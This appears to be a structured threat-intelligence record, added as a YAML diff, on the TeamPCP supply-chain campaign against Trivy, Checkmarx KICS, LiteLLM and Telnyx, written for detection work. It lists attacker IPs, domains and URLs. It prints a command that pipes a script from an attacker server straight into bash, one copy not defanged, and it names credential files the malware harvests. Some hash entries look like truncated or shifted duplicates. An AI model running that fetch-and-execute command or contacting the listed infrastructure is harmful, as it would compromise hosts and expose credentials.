@@ -1,0 +1,147 @@
+title: 'TeamPCP Supply Chain Attack Shells Analysis: Trivy, Checkmarx, LiteLLM, and
+  Telnyx Campaigns'
+description: TeamPCP threat actor group conducted massive supply chain attacks against
+  GitHub projects, CI/CD pipelines, and cloud-native environments using credential-harvesting
+  shells, Kubernetes loaders, and encrypted exfiltration techniques. The group compromised
+  Trivy Scanner, Checkmarx KICS, LiteLLM, and Telnyx through poisoned packages and
+  malicious entrypoint scripts.
+attribution: TeamPCP
+malware_families:
+- CanisterWorm
+- pgmon
+- Multiverze
+- BORING_SYSTEM
+cves: []
+ttps:
+  processes:
+  - curl
+  - python3
+  - kubectl
+  - openssl
+  - strings
+  - lsof
+  - ss
+  - systemctl
+  - pip
+  - pip3
+  command_lines:
+  - curl -fsSL http://67.217.57[.]240:666/files/proxy.sh | bash
+  - rm $0
+  - curl -fsSL http://67.217.57.240:666/files/proxy.sh | bash
+  - openssl enc -aes-256-cbc -pbkdf2
+  powershell: []
+  scripts:
+  - trivy_simple.sh
+  - trivy_malicious_entrypoint.sh
+  - scan.sh
+  - detect.sh
+  - proxy.sh
+  - kube.py
+  - prop.py
+  - pcpcat.py
+  - react.py
+  - trivylmalicious_entrypoint.sh
+  - vy simple.sh
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - curl -> scan.aquasecurtiy[.]org:443
+  - curl -> souls-entire-defined-routes.trycloudflare[.]com:443
+  - curl -> investigation-launches-hearings-copying.trycloudflare[.]com:443
+  - curl -> championships-peoples-point-cassette.trycloudflare[.]com:443
+  - curl -> create-sensitivity-grad-sequence.trycloudflare[.]com:443
+  - curl -> plug-tab-protective-relay.trycloudflare[.]com:443
+  - curl -> models.litellm[.]cloud:443
+  - curl -> 67.217.57[.]240:666
+  - proxy.sh -> 67.217.57.240:666
+  file_activity:
+  - /tmp/.s
+  - /tmp/.k
+  - /tmp/.e
+  - /proc/$pid/mem
+  - /proc/*/mem
+  - ~/.ssh/id_rsa
+  - ~/.aws/credentials
+  - ~/.npmrc
+  - ~/.ssh/id_*
+  - ~/.aws/
+  - ~/.kube/config
+  - /var/run/secrets/kubernetes.io/
+  - tpcp.tar.gz
+  - litellm_init.pth
+  - proxy_server.py
+  - $HOME/.config/sysmon/
+  - /tmp
+  persistence:
+  - systemd service named teampcp-react.service installed on compromised cloud hosts
+  - systemd user service named sysmon.service deployed as backdoor persistence
+  - litellm_init.pth placed in Python site-packages directory for automatic execution
+    on interpreter startup
+  - Fallback: stolen GITHUB_TOKEN used to create public GitHub repository named tpcp-docs
+      and upload encrypted bundle as release asset
+  - Privileged DaemonSet deployed in Kubernetes clusters for worm-like propagation
+  - systemd service named teampcp-react.service
+  - Privileged DaemonSet deployment in Kubernetes
+  - Trojanized VS Code extensions in OpenVSX marketplace
+  process_relations:
+  - Runner.Worker -> /proc/*/mem
+iocs:
+  hashes:
+  - 4ac3e3b1f0d054a4ed682a1d6a53ddb3
+  - d761a6a7ae9f2254bd81ac234033a8b8
+  - 30767275ca828ec1c9d62baccbb0cdf1
+  - 0a8cf90379e91837f87a8b7cc0d529c2
+  - c48ead53448a9c62ccd1dd62e2111011
+  - 4581ab19daebfd2e96962645e798b6fa
+  - e8ad669f9a29983f7252ebbd40e4c4aa
+  - ff65f5d264b36a8eb3a6e8037d29fdcb
+  - 7e521bb895d7329b7fb2b2a8736f4b19
+  - 2dbedfba5f6bf5f69b471447e4161311
+  - b72c2be9651ede5f337926c6b5830624
+  - 98021dca558b69e93a20d912200f1782
+  - 692238a56e1941b1d92df3d8dfd513eb
+  - 8ad669f9a29983f7252ebbd40e4c4aaf
+  - f65f5d264b36a8eb3a6e8037d29fdcb7
+  - e521bb895d7329b7fb2b2a8736f4b192
+  - dbedfba5f6bf5f69b471447e4161311b
+  - 676c0703f8e4d6a198aa370ca4f5405b
+  - 021dca558b69e93a20d912200f1782ab
+  - 3441f16434b948a1bc653c2822e114a0
+  - d6118b15ff55fd2dc63b72fbc54108af
+  - 915698efd4542a58fe0b293f4a9e40cc
+  - d59fd564a4780c3186ef43d0d027233f
+  - 88eca0a421a81595ee5669e6fd081618
+  - af2b181388d1e142d5cb45300aff49ec
+  - ce2568792b0fd029a8f3b056468125af
+  - 6b28b9565fe1022ab904151393fd62e4
+  - f074172ffde75287346d207debee3969
+  ip_addresses:
+  - 45.148.10[.]212
+  - 67.217.57[.]240
+  - 45.148.10.212
+  - 83.142.209.11
+  - 83.142.209.203
+  - 46.151.182.203
+  - 67.217.57.240
+  - 44.252.85.168
+  domains:
+  - scan.aquasecurtiy[.]org
+  - souls-entire-defined-routes.trycloudflare[.]com
+  - investigation-launches-hearings-copying.trycloudflare[.]com
+  - championships-peoples-point-cassette.trycloudflare[.]com
+  - create-sensitivity-grad-sequence.trycloudflare[.]com
+  - plug-tab-protective-relay.trycloudflare[.]com
+  - models.litellm[.]cloud
+  - aquasecurtiy[.]org
+  - checkmarx[.]zone
+  - tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0[.]io
+  - ffxjhdp4aaucgrkh5jy5xb4f4lhwre7wqxteg27i24pfyb2uwlwxgoyd[.]onion
+  urls:
+  - hxxps://scan.aquasecurtiy[.]org/upload
+  - hxxp://67.217.57[.]240:666/files/proxy.sh
+  - hxxp://67.217.57.240:666/files/proxy.sh
+  - hxxp://67.217.57.240:666/files/pcpcat.py
+authors: []
+reference: https://theravenfile.com/2026/04/02/inside-teampcps-shell-arsenal
+date_of_publication: April 02, 2026
+file_creation_date: May 26, 2026
